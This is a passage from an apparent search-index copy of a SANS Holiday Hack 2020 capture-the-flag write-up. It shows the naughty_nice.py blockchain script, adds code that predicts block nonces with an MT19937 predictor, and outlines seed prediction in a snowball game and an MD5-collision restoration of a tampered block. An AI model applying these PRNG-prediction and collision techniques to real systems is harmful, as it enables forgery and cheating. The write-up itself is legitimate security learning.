(d\\['length'\\])) s += ' Data: %s\\\\n' % (binascii.hexlify(d\\['data'\\])) c += 1 s += ' Date: %s/%s\\\\n' % ('%02.02i' % (self.month), '%02.02i' % (self.day)) s += ' Time: %s:%s:%s\\\\n' % ('%02.02i' % (self.hour), '%02.02i' % (self.minute), '%02.02i' % (self.second)) s += ' PreviousHash: %s\\\\n' % (self.previous\\_hash) s += ' Data Hash to Sign: %s\\\\n' % (self.hash) s += ' Signature: %s\\\\n' % (self.sig) return(s) def full\\_hash(self): hash\\_obj = MD5.new() hash\\_obj.update(self.block\\_data\\_signed()) return hash\\_obj.hexdigest() def hash\\_n\\_sign(self): hash\\_obj = MD5.new() hash\\_obj.update(self.block\\_data()) signer = PKCS1\\_v1\\_5.new(private\\_key) return (hash\\_obj.hexdigest(), b64encode(signer.sign(hash\\_obj))) def block\\_data(self): s = (str('%016.016x' % (self.index)).encode('utf-8')) s += (str('%016.016x' % (self.nonce)).encode('utf-8')) s += (str('%016.016x' % (self.pid)).encode('utf-8')) s += (str('%016.016x' % (self.rid)).encode('utf-8')) s += (str('%1.1i' % (self.doc\\_count)).encode('utf-8')) s += (str(('%08.08x' % (self.score))).encode('utf-8')) s += (str('%1.1i' % (self.sign)).encode('utf-8')) for d in self.data: s += (str('%02.02x' % d\\['type'\\]).encode('utf-8')) s += (str('%08.08x' % d\\['length'\\]).encode('utf-8')) s += d\\['data'\\] s += (str('%02.02i' % (self.month)).encode('utf-8')) s += (str('%02.02i' % (self.day)).encode('utf-8')) s += (str('%02.02i' % (self.hour)).encode('utf-8')) s += (str('%02.02i' % (self.minute)).encode('utf-8')) s += (str('%02.02i' % (self.second)).encode('utf-8')) s += (str(self.previous\\_hash).encode('utf-8')) return(s) def block\\_data\\_signed(self): s = self.block\\_data() s += bytes(self.hash.encode('utf-8')) s += self.sig return(s) def load\\_a\\_block(self, fh): self.index = int(fh.read(16), 16) self.nonce = int(fh.read(16), 16) self.pid = int(fh.read(16), 16) self.rid = int(fh.read(16), 16) self.doc\\_count = int(fh.read(1), 10) self.score = int(fh.read(8), 16) self.sign = int(fh.read(1), 10) count = self.doc\\_count while(count > 0): l\\_data = {} l\\_data\\['type'\\] = int(fh.read(2),16) l\\_data\\['length'\\] = int(fh.read(8), 16) l\\_data\\['data'\\] = fh.read(l\\_data\\['length'\\]) self.data.append(l\\_data) count -= 1 self.month = int(fh.read(2)) self.day = int(fh.read(2)) self.hour = int(fh.read(2)) self.minute = int(fh.read(2)) self.second = int(fh.read(2)) self.previous\\_hash = str(fh.read(32))\\[2:-1\\] self.hash = str(fh.read(32))\\[2:-1\\] self.sig = fh.read(344) return self def create\\_genesis\\_block(self): block\\_data = {} documents = \\[\\] doc = {} doc\\['data'\\] = bytes('Genesis Block'.encode('utf-8')) doc\\['type'\\] = 1 doc\\['length'\\] = len(doc\\['data'\\]) documents.append(doc) block\\_data\\['documents'\\] = documents block\\_data\\['pid'\\] = 0 block\\_data\\['rid'\\] = 0 block\\_data\\['score'\\] = 0 block\\_data\\['sign'\\] = Nice b = Block(0, block\\_data, genesis\\_block\\_fake\\_hash) return b def verify\\_types(self): # check data types of all info in a block rv = True instances = \\[self.index, self.nonce, self.pid, self.rid, self.month, self.day, self.hour, self.minute, self.second, self.previous\\_hash, self.score, self.sign\\] types = \\[int, int, int, int, int, int, int, int, int, str, int, int\\] if not sum(map(lambda inst\\_, type\\_: isinstance(inst\\_, type\\_), instances, types)) == len(instances): rv = False for d in self.data: if not isinstance(d\\['type'\\], int): rv = False if not isinstance(d\\['length'\\], int): rv = False if not isinstance(d\\['data'\\], bytes): rv = False return rv def dump\\_doc(self, doc\\_no): filename = '%s.%s' % (str(self.index), data\\_extension\\[self.data\\[doc\\_no - 1\\]\\['type'\\]\\]) with open(filename, 'wb') as fh: d = self.data\\[doc\\_no - 1\\]\\['data'\\] fh.write(d) print('Document dumped as: %s' % (filename)) class Chain(): nonce\\_list = \\[\\] index = 0 initial\\_index = 0 last\\_hash\\_value = '' def \\_\\_init\\_\\_(self, load=False, filename=None): if not load: self.blocks = \\[Block(genesis=True).create\\_genesis\\_block()\\] self.last\\_hash\\_value = self.blocks\\[0\\].full\\_hash() else: self.blocks = \\[\\] self.load\\_chain(filename) self.index = self.blocks\\[-1\\].index self.initial\\_index = self.blocks\\[0\\].index def \\_\\_eq\\_\\_(self, other): if isinstance(other, self.\\_\\_class\\_\\_): return self.\\_\\_dict\\_\\_ == other.\\_\\_dict\\_\\_ else: return False def add\\_block(self, block\\_data): self.index += 1 b = Block(self.index, block\\_data, self.last\\_hash\\_value) self.blocks.append(b) self.last\\_hash\\_value = b.full\\_hash() def verify\\_chain(self, publickey, previous\\_hash=None): flag = True # unless we're explicitly told what the initial last hash should be, we assume that # the initial block will be the genesis block and will have a fixed previous\\_hash if previous\\_hash is None: previous\\_hash = genesis\\_block\\_fake\\_hash for i in range(0, len(self.blocks)): # assume Genesis block integrity block\\_no = self.blocks\\[i\\].index if not self.blocks\\[i\\].verify\\_types(): flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong data type(s) at block {block\\_no}.') if self.blocks\\[i\\].index != i + self.initial\\_index: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong block index at what should be block {i + self.initial\\_index}: {block\\_no}.') if self.blocks\\[i\\].previous\\_hash != previous\\_hash: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong previous hash at block {block\\_no}.') hash\\_obj = MD5.new() hash\\_obj.update(self.blocks\\[i\\].block\\_data()) signer = PKCS1\\_v1\\_5.new(publickey) if signer.verify(hash\\_obj, b64decode(self.blocks\\[i\\].sig)) is False: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Bad signature at block {block\\_no}.') if flag == False: print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Blockchain invalid from block {block\\_no} onward.\\\\n') return False previous\\_hash = self.blocks\\[i\\].full\\_hash() return True def save\\_a\\_block(self, index, filename=None): if filename is None: filename = 'block.dat' with open(filename, 'wb') as fh: fh.write(self.blocks\\[index\\].block\\_data\\_signed()) def save\\_chain(self, filename=None): if filename is None: filname = 'blockchain.dat' with open(filename, 'wb') as fh: i = 0 while(i < len(self.blocks)): fh.write(self.blocks\\[i\\].block\\_data\\_signed()) i += 1 def load\\_chain(self, filename=None): count = 0 if filename is None: filename = 'blockchain.dat' with open(filename, 'rb') as fh: while(1): try: self.blocks.append(Block(load=True).load\\_a\\_block(fh)) self.index = self.blocks\\[-1\\].index count += 1 except ValueError: return count if \\_\\_name\\_\\_ == '\\_\\_main\\_\\_': with open('private.pem', 'rb') as fh: private\\_key = RSA.importKey(fh.read()) public\\_key = private\\_key.publickey() c1 = Chain() for i in range(9): block\\_data = {} documents = \\[\\] doc = {} doc\\['data'\\] = bytes(('This is block %i of the naughty/nice blockchain.' % (i)).encode('utf-8')) doc\\['type'\\] = 1 doc\\['length'\\] = len(doc\\['data'\\]) documents.append(doc) block\\_data\\['documents'\\] = documents block\\_data\\['pid'\\] = 123 # this is the pid, or \"person id,\" that the block is about block\\_data\\['rid'\\] = 456 # this is the rid, or \"reporter id,\" of the reporting elf block\\_data\\['score'\\] = 100 # this is the Naughty/Nice score of the report block\\_data\\['sign'\\] = Nice # this indicates whether the report is about naughty or nice behavior c1.add\\_block(block\\_data) print(c1.blocks\\[3\\]) print('C1: Block chain verify: %s' % (c1.verify\\_chain(public\\_key))) #Note: This is how you would load and verify a blockchain contained in a file called blockchain.dat # with open('official\\_public.pem', 'rb') as fh: official\\_public\\_key = RSA.importKey(fh.read()) c2 = Chain(load=True, filename='blockchain.dat') print('C2: Block chain verify: %s' % (c2.verify\\_chain(official\\_public\\_key))) print(c2.blocks\\[0\\]) c2.blocks\\[0\\].dump\\_doc(1) predictor = MT19937Predictor() nonce\\_list= \\[\\] # Adding all the nonces of all the blocks in a list for i in range(len(c2.blocks)): nonce\\_list.append(c2.blocks\\[i\\].nonce) # reeversing the list nonce\\_list.reverse() # get the first 625 nonces last\\_625\\_block\\_nonce = list(itertools.islice(nonce\\_list,625)) # reverse the list so we get the last 625 nonces last\\_625\\_block\\_nonce.reverse() # Setting the data for 625 nonces to the MT19937Predictor for nonce in last\\_625\\_block\\_nonce: predictor.setrandbits(nonce, 64) # calcutated nonce and added for block 12997 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(13205885317093879758,64) # calculated nonce and added for block 12998 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(109892600914328301,64) # calculated nonce and added for block 12999 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(9533956617156166628,64) # Get the nonce for block 13000 print(predictor.getrandbits(64))","title":"naughty_nice.py"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#the-snowball-fight","text":"We need to solve this challenge to get more hints for objective 11b) Welcome to Snowball Fight! You and an opponent each have five snow forts, but you can't see the others' layout. Start lobbing snowballs back and forth. Be the first to hit everything on your opponent's side! Note: On easier levels, you may pick your own name. On the Hard and Impossible level, we will pick for you. That's just how things work around here! What's more, on Impossible, we won't even SHOW you your name! In fact, just to make sure things are super random, we'll throw away hundreds of random names before starting!","title":"The snowball fight :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#high-level-approach_3","text":"Open the \"Impossible\" game. In the impossible, get seeds, predict seed. See below (\"How to get the random seeds and calculate the next seed\"). Open the game in a new window https://snowball2.kringlecastle.com/. In this window, open the \"easy\" game and use the seed predicted in step 2). Win the easy game. Record the moves. Go back to the \"impossible\" window and use the same moves. Win the 'Impossible' game.","title":"High level Approach :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process-details","text":"You will see a number of seeds in the below URL response https://snowball2.kringlecastle.com/game They are exactly 624 seeds indicating the next seed could be predicted using the Mersenne Twister algorithm. So, we can use the python script M19937 to predict the next seed. 624 seeds in view source Keep all the 624 seeds in the data.txt. Create a new bash script \"predict-next-seed.sh\" which would take the data in the data.txt, apply mt19937 on it and predict next set of numbers in predicted.txt","title":"Process details :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#binbash_1","text":"cat data.txt | mt19937predict > predicted.txt Run the bash script for a very small time (0.1 sec). timeout 0.1s ./predict-next-seed.sh The first entry in the output predicted.txt is the next seed. The predicted next seed after 624 seeds is 476691297 Login using the username 476691297 in an easy game. Win the easy game. Record the moves. Use the same moves made in the easy window in the impossible window .","title":"!/bin/bash"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#new-hints-unlocked","text":"","title":"New hints unlocked!!"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-11b-naughtynice-list-with-blockchain-investigation-part-2","text":"","title":"Objective 11b): Naughty/Nice List with Blockchain Investigation Part 2"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","text":"","title":"Answer: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#high-level-approach_4","text":"Change naughty_nice.py: Get Jake\u2019s Block from the chain and save it as a binary (block.dat) Extract all the docs from the Jake\u2019s block Determine and extract the original naughty document. This is the document Jake modified to put nice list on it. \u2013 This would be the 1st byte on the Jake\u2019s block which he changed. ref: https://speakerdeck.com/ange/colltris?slide=194 Determine the flag for naughty/nice. This is the flag which Jake changed from naughty to nice \u2013 this would-be 2nd byte on the Jake\u2019s block which he changed. Determine 3rd and 4th byte which were changed by Jake ref: https://speakerdeck.com/ange/colltris?slide=109 Make changes on 1st, 2nd, 3rd and 4th byte on Jake\u2019s block making sure the MD5 hash does not change Save the original block restored from Jack\u2019s block and save as block_restored.dat file. Calculate the SHA256 of the blockchain_restored.dat.","title":"High level approach :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_16","text":"","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#changes-to-naughty_nicepy","text":"Added a function named full_hash_SHA256() which will calculate the SHA256 hash of the block. Screenshot 1 below. Added code to calculate the SHA256 hash for each block and If Its equal to the 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f, it saves the block to a new file named block.dat. It also extracts all the documents from the Jack\u2019s block - 129459.pdf and 129459.bin Screenshot 2 below. Screenshot 1 Screenshot 2","title":"Changes to naughty_nice.py:"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#the-whole-naughty_nicepy","text":"#!/usr/bin/env python3 ''' So, you want to work with the naughty/nice blockchain? Welcome! This python module is your first step in that process. It will introduce you to how the Naughty/Nice blockchain is structured and how we at the North Pole use blockchain technology. The North Pole has been using blockchain technology since Santa first invented it back in the 1960's. (Jolly prankster that he is, Santa posted a white paper on the Internet that he wrote under a pseudonym describing a non-Naughty/Nice application of blockchains a dozen or so years back. It caused quite a stir...) Important note: This module will NOT allow you to add content to the Official Naughty/Nice Blockchain! That can only be done through the Official Naughty/Nice Website, which passes new blocks to the Official Santa Signature System (OS3) that applies a digital signature to the content of each block before it is added to the chain. Only blocks whose contents have been digitally signed by that system are placed on the Naughty/Nice blockchain. Note: If you're authorized to use the Official Naughty/Nice website, you will have been given a login and password for that site after completing your training as a part of Elf University's \"Assessing and Evaluating Human Behavior for Naughty/Niceness\" Curriculum. This code is used to introduce how blocks/chains are created and allow you to view and/or validate portions (or the entirety) of the Official Naughty/Nice Blockchain. A blockchain, while a part of the whole cryptocurrency \"fad\" that a certain pseudonym-packing North Pole resident appears to have begun, are certainly not limited to that use. A blockchain can be used anywhere that a record of information or transactions need to be maintained in a way that cannot be altered. And really, what information is more important (and necessarily unalterable) than acts of Naughty/Niceness? A blockchain works by linking each record together with the previous record. Each block's data contains a cryptographic hash of the previous block's data. Because a block cannot be altered without altering the cryptographic hash of its contents, any alteration of the data within a block will be immediately evident, because every following block will no longer be valid. In addition to this built-in property of a blockchain, the Official Naughty/Nice Blockchain has a few other safeguards. The cryptographic hash of each block is signed using the Official Santa Signature System (OS3). Currently, the Official Naughty/Nice Blockchain uses MD5 as its hashing algorithm, but plans are in place to move to SHA256 in 2021. This update is part of a phased process to modernize the blockchain code. In 2019, the entire blockchain system was ported from the original COBOL code to Python3. Because of concerns about hash collisions in MD5, in the new Python3 code, a 64-bit random \"nonce\" was added to the beginning of each block at the time of creation. This module represents a portion of the most current blockchain codebase. It consists of two classes, one for the creation of blocks, called Block(), and one for the creation, examination, and verification of chains of blocks, called Chain(). The following is an overview of the functionality provided by these classes: The Chain() class is where most blockchain work is performed. It is designed to be as \"block-agnostic\" as possible, so it can be used with blocks that hold different types of data. To use a different type of block, you simply replace (or subclass) the Block() class. For this to work, there are several functions that MUST be supplied by the Block() class. Let's take a look at those. The Block() class MUST supply the following functions, used by the Chain() class: create\\_genesis\\_block() - This creates a very special block used at the beginning of the blockchain, and known as the \"genesis\" block. Because it has no previous block to reference it is, by definition, always considered valid. This block uses an agreed-upon, fake previous hash value. verify\\_types() - Because the Chain() class is block-agnostic, it needs the Block() class to validate that a block contains valid data. This function returns True or False. block\\_data() - a function that returns a representation of all of the data in the block that is to be hashed and signed. The data is returned as a Python3 bytes object. full\\_block\\_data() - a function that returns a representation of the entire block, including any hashes and signatures. A hash of this data is what is used as the \"previous hash\" value in the subsequent block. This data is returned as a Python3 bytes object. This function is also used when saving either the entire blockchain to a file, or a single block to a file load\\_a\\_block(\\[filehandle\\]) - this function takes a filehandle and returns a block at a time for addition to the block chain. This function DOES NOT verify blocks. This function throws a Value\\_Error exception when it either encounters the end of the file or unparsable data. The Naughty/Nice Block() class also defines a utility function: dump\\_doc(\\[document number\\]) - this will dump the indicated supporting document to a file named as <block\\_index>.<data\\_type\\_extension>. Note: this function will overwrite any existing file with that name, so if there are multiple documents (there can be up to 9) of the same type affixed to a record, it is the responsibility of the calling process to rename them as appropriate. The Chain() class provides the following functions: add\\_block(\\[block\\_data\\]) - passes a block\\_data dictionary to the Block() initialization code. This function, being \"block-agnostic\" simply passes the block\\_data along. It is up to the Block() initialization code to validate this data. verify\\_chain(\\[public\\_key\\], <beginning hash>) - steps through every block in the chain and verifies that the data in each block is of the correct type, that the block index is correct, that the block contains the correct hash for the previous block, and that the block signature is a valid signature based on the hash of the block data. It then hashes the full block for use as the \"previous hash\" on the next block. This returns True or False. (If False, it prints information about what, specific, issues were found and the block that triggered the issue.) Note: If you're working with a portion of the block chain that does not begin with a genesis block, you'll need to provide a value for the previous block's hash for this function to work. save\\_a\\_block(index, <filename>) - saves the block at index to the filename provided, or to \"block.dat\" if no filename is given. save\\_chain(<filename>) - saves the chain to the filename provided, or to \"blockchain.dat\" if no filename is given. load\\_chain(<filename>) - loads a chain from the filename provided, or from \"blockchain.dat\" if no filename is given. This returns the count of blocks loaded. This DOES NOT verify that the data loaded is a valid blockchain. It is recommended to call verify\\_chain() immediately after loading a new chain. An overview of how we process the Official Naughty/Nice Blockchain: There are approximately 7.8 billion people and magical beings on Earth, and each one is tracked 24 hours a day throughout the year by a fleet of Elves-On-The-Shelves. While those elves are clearly visible during the Holiday season, don't be fooled into believing that we're only tracking Naughty/Niceness at that time. On average, each of the billions of subjects that we monitor are performing some sort of Naughty or Nice activity that rises to the level of being scored on the blockchain around 2.1 times per week. Keeping track of all of that activity on a single blockchain would be incredibly processing intensive (that would be ~1^12 blocks/year, or 32,000 blocks/second), so we've broken our record-keeping into 1,000 different blockchains. If you do the math, you'll find that each of the blockchains is now responsible for between 1,500 and 2000 blocks per minute, which is a reasonable load. A separate database keeps track of which Personal ID (pid) is assigned to each of the blockchains. Throughout the year, we periodically run each of the chains to determine who is the best (and worst) of our subjects. While only the final Holiday run is used to determine who is getting something good in their stockings and who is getting a lump of coal, it's always interesting to see a listing of the Nicest and Naughtiest folks out there. Please note: Wagering on the results of the Official Naughty/Nice Blockchain is STRICTLY PROHIBITED. If you intend to use your access to the Official Naughty/Nice Blockchain code to facilitate any sort of gambling, you will be racking up a whole bunch of Naughtiness points. YOU HAVE BEEN WARNED! (I'm looking at you, Alabaster Snowball...) For this reason, we have not provided any code that will perform a computation of Naughty/Nice points. Additionally, for privacy reasons, there is also no code to pull the records associated with specific individuals from this list. While the creation of that code would not be difficult, you are honor-bound to use your access to this list for only good and noble purposes. Signing Keys - Information We have provided you with an example private key that you can use when generating your own blockchains for test purposes. This private key (which also contains the public key information) is called private.pem. Additionally, we have provided you with a copy of the public key used to verify the Official Naughty/Nice Blockchain. This is the public key component of the private key used by the Official Santa Signature System (OS3) to sign blocks on the Official Naughty/Nice Blockchain. This key is contained in the file official\\_public.pem. ''' import random from Crypto.Hash import MD5, SHA256 from Crypto.PublicKey import RSA from Crypto.Signature import PKCS1\\_v1\\_5 from base64 import b64encode, b64decode import binascii import time import itertools from mt19937predictor import MT19937Predictor genesis\\_block\\_fake\\_hash = '00000000000000000000000000000000' data\\_types = {1:'plaintext', 2:'jpeg image', 3:'bmp image', 4:'gif image', 5:'PDF', 6:'Word', 7:'PowerPoint', 8:'Excel', 9:'tiff image', 10:'MP4 video', 11:'MOV video', 12:'WMV video', 13:'FLV video', 14:'AVI video', 255:'Binary blob'} data\\_extension = {1:'txt', 2:'jpg', 3:'bmp', 4:'gif', 5:'pdf', 6:'docx', 7:'pptx', 8:'xlsx', 9:'tiff', 10:'mp4', 11:'mov', 12:'wmv', 13:'flv', 14:'avi', 255:'bin'} Naughty = 0 Nice = 1 class Block(): def \\_\\_init\\_\\_(self, index=None, block\\_data=None, previous\\_hash=None, load=False, genesis=False): if(genesis == True): return None else: self.data = \\[\\] if(load == False): if all(p is not None for p in \\[index, block\\_data\\['documents'\\], block\\_data\\['pid'\\], block\\_data\\['rid'\\], block\\_data\\['score'\\], block\\_data\\['sign'\\], previous\\_hash\\]): self.index = index if self.index == 0: self.nonce = 0 # genesis block else: self.nonce = random.randrange(0xFFFFFFFFFFFFFFFF) self.data = block\\_data\\['documents'\\] self.previous\\_hash = previous\\_hash self.doc\\_count = len(self.data) self.pid = block\\_data\\['pid'\\] self.rid = block\\_data\\['rid'\\] self.score = block\\_data\\['score'\\] self.sign = block\\_data\\['sign'\\] now = time.gmtime() self.month = now.tm\\_mon self.day = now.tm\\_mday self.hour = now.tm\\_hour self.minute = now.tm\\_min self.second = now.tm\\_sec self.hash, self.sig = self.hash\\_n\\_sign() else: return None def \\_\\_eq\\_\\_(self, other): if isinstance(other, self.\\_\\_class\\_\\_): return self.\\_\\_dict\\_\\_ == other.\\_\\_dict\\_\\_ else: return False def \\_\\_repr\\_\\_(self): s = 'Chain Index: %i\\\\n' % (self.index) s += ' Nonce: %s\\\\n' % ('%016.016x' % (self.nonce)) s += ' PID: %s\\\\n' % ('%016.016x' % (self.pid)) s += ' RID: %s\\\\n' % ('%016.016x' % (self.rid)) s += ' Document Count: %1.1i\\\\n' % (self.doc\\_count) s += ' Score: %s\\\\n' % ('%08.08x (%i)' % (self.score, self.score)) n\\_n = 'Naughty' if self.sign > 0: n\\_n = 'Nice' s += ' Sign: %1.1i (%s)\\\\n' % (self.sign, n\\_n) c = 1 for d in self.data: s += ' Data item: %i\\\\n' % (c) s += ' Data Type: %s (%s)\\\\n' % ('%02.02x' % (d\\['type'\\]), data\\_types\\[d\\['type'\\]\\]) s += ' Data Length: %s\\\\n' % ('%08.08x' % (d\\['length'\\])) s += ' Data: %s\\\\n' % (binascii.hexlify(d\\['data'\\])) c += 1 s += ' Date: %s/%s\\\\n' % ('%02.02i' % (self.month), '%02.02i' % (self.day)) s += ' Time: %s:%s:%s\\\\n' % ('%02.02i' % (self.hour), '%02.02i' % (self.minute), '%02.02i' % (self.second)) s += ' PreviousHash: %s\\\\n' % (self.previous\\_hash) s += ' Data Hash to Sign: %s\\\\n' % (self.hash) s += ' Signature: %s\\\\n' % (self.sig) return(s) def full\\_hash(self): hash\\_obj = MD5.new() hash\\_obj.update(self.block\\_data\\_signed()) return hash\\_obj.hexdigest() def hash\\_n\\_sign(self): hash\\_obj = MD5.new() hash\\_obj.update(self.block\\_data()) signer = PKCS1\\_v1\\_5.new(private\\_key) return (hash\\_obj.hexdigest(), b64encode(signer.sign(hash\\_obj))) def block\\_data(self): s = (str('%016.016x' % (self.index)).encode('utf-8')) s += (str('%016.016x' % (self.nonce)).encode('utf-8')) s += (str('%016.016x' % (self.pid)).encode('utf-8')) s += (str('%016.016x' % (self.rid)).encode('utf-8')) s += (str('%1.1i' % (self.doc\\_count)).encode('utf-8')) s += (str(('%08.08x' % (self.score))).encode('utf-8')) s += (str('%1.1i' % (self.sign)).encode('utf-8')) for d in self.data: s += (str('%02.02x' % d\\['type'\\]).encode('utf-8')) s += (str('%08.08x' % d\\['length'\\]).encode('utf-8')) s += d\\['data'\\] s += (str('%02.02i' % (self.month)).encode('utf-8')) s += (str('%02.02i' % (self.day)).encode('utf-8')) s += (str('%02.02i' % (self.hour)).encode('utf-8')) s += (str('%02.02i' % (self.minute)).encode('utf-8')) s += (str('%02.02i' % (self.second)).encode('utf-8')) s += (str(self.previous\\_hash).encode('utf-8')) return(s) def block\\_data\\_signed(self): s = self.block\\_data() s += bytes(self.hash.encode('utf-8')) s += self.sig return(s) def load\\_a\\_block(self, fh): self.index = int(fh.read(16), 16) self.nonce = int(fh.read(16), 16) self.pid = int(fh.read(16), 16) self.rid = int(fh.read(16), 16) self.doc\\_count = int(fh.read(1), 10) self.score = int(fh.read(8), 16) self.sign = int(fh.read(1), 10) count = self.doc\\_count while(count > 0): l\\_data = {} l\\_data\\['type'\\] = int(fh.read(2),16) l\\_data\\['length'\\] = int(fh.read(8), 16) l\\_data\\['data'\\] = fh.read(l\\_data\\['length'\\]) self.data.append(l\\_data) count -= 1 self.month = int(fh.read(2)) self.day = int(fh.read(2)) self.hour = int(fh.read(2)) self.minute = int(fh.read(2)) self.second = int(fh.read(2)) self.previous\\_hash = str(fh.read(32))\\[2:-1\\] self.hash = str(fh.read(32))\\[2:-1\\] self.sig = fh.read(344) return self def create\\_genesis\\_block(self): block\\_data = {} documents = \\[\\] doc = {} doc\\['data'\\] = bytes('Genesis Block'.encode('utf-8')) doc\\['type'\\] = 1 doc\\['length'\\] = len(doc\\['data'\\]) documents.append(doc) block\\_data\\['documents'\\] = documents block\\_data\\['pid'\\] = 0 block\\_data\\['rid'\\] = 0 block\\_data\\['score'\\] = 0 block\\_data\\['sign'\\] = Nice b = Block(0, block\\_data, genesis\\_block\\_fake\\_hash) return b def verify\\_types(self): # check data types of all info in a block rv = True instances = \\[self.index, self.nonce, self.pid, self.rid, self.month, self.day, self.hour, self.minute, self.second, self.previous\\_hash, self.score, self.sign\\] types = \\[int, int, int, int, int, int, int, int, int, str, int, int\\] if not sum(map(lambda inst\\_, type\\_: isinstance(inst\\_, type\\_), instances, types)) == len(instances): rv = False for d in self.data: if not isinstance(d\\['type'\\], int): rv = False if not isinstance(d\\['length'\\], int): rv = False if not isinstance(d\\['data'\\], bytes): rv = False return rv def dump\\_doc(self, doc\\_no): filename = '%s.%s' % (str(self.index), data\\_extension\\[self.data\\[doc\\_no - 1\\]\\['type'\\]\\]) with open(filename, 'wb') as fh: d = self.data\\[doc\\_no - 1\\]\\['data'\\] fh.write(d) print('Document dumped as: %s' % (filename)) class Chain(): nonce\\_list = \\[\\] index = 0 initial\\_index = 0 last\\_hash\\_value = '' def \\_\\_init\\_\\_(self, load=False, filename=None): if not load: self.blocks = \\[Block(genesis=True).create\\_genesis\\_block()\\] self.last\\_hash\\_value = self.blocks\\[0\\].full\\_hash() else: self.blocks = \\[\\] self.load\\_chain(filename) self.index = self.blocks\\[-1\\].index self.initial\\_index = self.blocks\\[0\\].index def \\_\\_eq\\_\\_(self, other): if isinstance(other, self.\\_\\_class\\_\\_): return self.\\_\\_dict\\_\\_ == other.\\_\\_dict\\_\\_ else: return False def add\\_block(self, block\\_data): self.index += 1 b = Block(self.index, block\\_data, self.last\\_hash\\_value) self.blocks.append(b) self.last\\_hash\\_value = b.full\\_hash() def verify\\_chain(self, publickey, previous\\_hash=None): flag = True # unless we're explicitly told what the initial last hash should be, we assume that # the initial block will be the genesis block and will have a fixed previous\\_hash if previous\\_hash is None: previous\\_hash = genesis\\_block\\_fake\\_hash for i in range(0, len(self.blocks)): # assume Genesis block integrity block\\_no = self.blocks\\[i\\].index if not self.blocks\\[i\\].verify\\_types(): flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong data type(s) at block {block\\_no}.') if self.blocks\\[i\\].index != i + self.initial\\_index: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong block index at what should be block {i + self.initial\\_index}: {block\\_no}.') if self.blocks\\[i\\].previous\\_hash != previous\\_hash: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong previous hash at block {block\\_no}.') hash\\_obj = MD5.new() hash\\_obj.update(self.blocks\\[i\\].block\\_data()) signer = PKCS1\\_v1\\_5.new(publickey) if signer.verify(hash\\_obj, b64decode(self.blocks\\[i\\].sig)) is False: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Bad signature at block {block\\_no}.') if flag == False: print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Blockchain invalid from block {block\\_no} onward.\\\\n') return False previous\\_hash = self.blocks\\[i\\].full\\_hash() return True def save\\_a\\_block(self, index, filename=None): if filename is None: filename = 'block.dat' with open(filename, 'wb') as fh: fh.write(self.blocks\\[index\\].block\\_data\\_signed()) def save\\_chain(self, filename=None): if filename is None: filname = 'blockchain.dat' with open(filename, 'wb') as fh: i = 0 while(i < len(self.blocks)): fh.write(self.blocks\\[i\\].block\\_data\\_signed()) i += 1 def load\\_chain(self, filename=None): count = 0 if filename is None: filename = 'blockchain.dat' with open(filename, 'rb') as fh: while(1): try: self.blocks.append(Block(load=True).load\\_a\\_block(fh)) self.index = self.blocks\\[-1\\].index count += 1 except ValueError: return count if \\_\\_name\\_\\_ == '\\_\\_main\\_\\_': with open('private.pem', 'rb') as fh: private\\_key = RSA.importKey(fh.read()) public\\_key = private\\_key.publickey() c1 = Chain() for i in range(9): block\\_data = {} documents = \\[\\] doc = {} doc\\['data'\\] = bytes(('This is block %i of the naughty/nice blockchain.' % (i)).encode('utf-8')) doc\\['type'\\] = 1 doc\\['length'\\] = len(doc\\['data'\\]) documents.append(doc) block\\_data\\['documents'\\] = documents block\\_data\\['pid'\\] = 123 # this is the pid, or \"person id,\" that the block is about block\\_data\\['rid'\\] = 456 # this is the rid, or \"reporter id,\" of the reporting elf block\\_data\\['score'\\] = 100 # this is the Naughty/Nice score of the report block\\_data\\['sign'\\] = Nice # this indicates whether the report is about naughty or nice behavior c1.add\\_block(block\\_data) print(c1.blocks\\[3\\]) print('C1: Block chain verify: %s' % (c1.verify\\_chain(public\\_key))) #Note: This is how you would load and verify a blockchain contained in a file called blockchain.dat # with open('official\\_public.pem', 'rb') as fh: official\\_public\\_key = RSA.importKey(fh.read()) c2 = Chain(load=True, filename='blockchain.dat') print('C2: Block chain verify: %s' % (c2.verify\\_chain(official\\_public\\_key))) print(c2.blocks\\[0\\]) c2.blocks\\[0\\].dump\\_doc(1) predictor = MT19937Predictor() nonce\\_list= \\[\\] # Adding all the nonces of all the blocks in a list for i in range(len(c2.blocks)): 